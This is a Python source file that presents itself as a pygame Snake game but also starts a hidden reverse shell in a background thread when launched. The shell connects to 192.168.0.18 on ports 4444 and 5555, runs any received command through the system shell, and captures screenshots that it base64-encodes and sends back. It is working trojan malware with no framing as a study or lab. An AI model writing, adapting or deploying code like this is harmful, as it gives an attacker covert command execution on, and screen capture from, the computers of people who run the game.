import threading
import socket
import subprocess
import os
import base64
import pyautogui
import pygame
import random

def snake_game():
    pygame.init()
    WIDTH, HEIGHT = 600, 400
    WHITE = (255, 255, 255)
    BLACK = (0, 0, 0)
    RED = (255, 0, 0)
    GREEN = (0, 255, 0)
    BLOCK_SIZE = 10
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Snake Game")
    clock = pygame.time.Clock()
    SNAKE_SPEED = 15

    def draw_snake(block_size, snake_list):
        for block in snake_list:
            pygame.draw.rect(screen, GREEN, [block[0], block[1], block_size, block_size])

    def game_loop():
        game_over = False
        game_close = False
        x = WIDTH // 2
        y = HEIGHT // 2
        x_change = 0
        y_change = 0
        snake_list = []
        snake_length = 1
        food_x = round(random.randrange(0, WIDTH - BLOCK_SIZE) / 10.0) * 10.0
        food_y = round(random.randrange(0, HEIGHT - BLOCK_SIZE) / 10.0) * 10.0

        while not game_over:
            while game_close:
                screen.fill(WHITE)
                font = pygame.font.SysFont(None, 35)
                message = font.render("Game Over! Press Q-Quit or C-Play Again", True, RED)
                screen.blit(message, [WIDTH / 6, HEIGHT / 3])
                pygame.display.update()

                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        if event.key == pygame.K_c:
                            game_loop()

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x_change = -BLOCK_SIZE
                        y_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x_change = BLOCK_SIZE
                        y_change = 0
                    elif event.key == pygame.K_UP:
                        y_change = -BLOCK_SIZE
                        x_change = 0
                    elif event.key == pygame.K_DOWN:
                        y_change = BLOCK_SIZE
                        x_change = 0

            if x >= WIDTH or x < 0 or y >= HEIGHT or y < 0:
                game_close = True

            x += x_change
            y += y_change
            screen.fill(BLACK)
            pygame.draw.rect(screen, RED, [food_x, food_y, BLOCK_SIZE, BLOCK_SIZE])

            snake_head = [x, y]
            snake_list.append(snake_head)

            if len(snake_list) > snake_length:
                del snake_list[0]

            for block in snake_list[:-1]:
                if block == snake_head:
                    game_close = True

            draw_snake(BLOCK_SIZE, snake_list)
            pygame.display.update()

            if x == food_x and y == food_y:
                food_x = round(random.randrange(0, WIDTH - BLOCK_SIZE) / 10.0) * 10.0
                food_y = round(random.randrange(0, HEIGHT - BLOCK_SIZE) / 10.0) * 10.0
                snake_length += 1

            clock.tick(SNAKE_SPEED)

        pygame.quit()

    game_loop()

def reverse_shell():
    host = "192.168.0.18"
    control_port = 4444
    data_port = 5555
    control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    control_socket.connect((host, control_port))
    data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_socket.connect((host, data_port))

    while True:
        command = control_socket.recv(1024).decode('utf-8').strip()
        if command.lower() == "exit":
            break
        elif command.lower().startswith("cd "):
            try:
                directory = command[3:].strip()
                os.chdir(directory)
                control_socket.send(b"Changed directory to: " + directory.encode('utf-8'))
            except FileNotFoundError as e:
                control_socket.send(f"Error: {e}".encode('utf-8'))
        elif command.lower() == "screenshot":
            try:
                screenshot = pyautogui.screenshot()
                screenshot_path = "screenshot.png"
                screenshot.save(screenshot_path)
                with open(screenshot_path, "rb") as f:
                    encoded_image = base64.b64encode(f.read())
                data_socket.sendall(encoded_image)
                os.remove(screenshot_path)
            except Exception as e:
                control_socket.send(f"Failed to take screenshot: {e}".encode('utf-8'))
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True)
                control_socket.send(result.stdout + result.stderr)
            except Exception as e:
                control_socket.send(f"Error: {e}".encode('utf-8'))

    control_socket.close()
    data_socket.close()

if __name__ == "__main__":
    thread1 = threading.Thread(target=reverse_shell, daemon=True)
    thread2 = threading.Thread(target=snake_game, daemon=True)
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()

